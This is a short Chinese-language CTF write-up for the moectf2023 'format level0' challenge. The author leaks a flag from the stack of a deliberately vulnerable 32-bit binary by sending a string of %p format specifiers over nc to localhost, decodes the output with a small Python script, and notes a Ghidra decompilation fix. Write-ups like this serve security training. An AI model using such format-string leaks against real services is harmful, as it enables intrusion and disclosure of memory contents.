---
title: moectf2023 - format level0
date: 2023/9/24 12:00:00
updated: 2024/7/25 12:34:56
tags:
    - noob
excerpt: 通过分析`format_level0`程序，利用printf漏洞泄露栈信息并成功获取flag。
---

## 文件分析

下载`format_level0`, 保护全开
ghidra分析为32位程序

## 解题思路

> Ghidra这次解析失误了，完全不可读...  
> 用的Decompiler Explorer，BinaryNinja给出的正确代码
>
> ![GhidraFailure](/assets/moectf2023/GhidraFail.png)

反编译后，flag已被读取到栈上，并且存在printf漏洞，gdb调试可知该flag位于第7个参数  
笨办法强攻：使用大量%p泄露栈上信息，找到flag后解析(直接%7$s会SIGSEGV)

## EXPLOIT

nc localhost 34109  
*%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p*

从第7个16进制数开始复制flag直到0xa的内容

```python
txt = "<C-S-v>" # 粘贴内容
slices = txt.split('0x')[1:]
flag = ''

for s in slices:
    for i in range(6, -1, -2):
        flag += chr(int(s[i:i+2], 16))

print(flag)
```

> 奇怪的是，别的flag都是moectf开头，这个是JBtf开头，不知道出题者何意

Done.

## HOTFIX

已在github发issue得到回复：只需要将`.plt`, `.plt.sec`和`.plt.got`全部设置好ebx的值即可，
在`.plt`中已给出ebx值，只要在其他段全选后右键设置寄存器的值与`.got`的首地址相同即可

[REF](https://github.com/NationalSecurityAgency/ghidra/issues/5825)
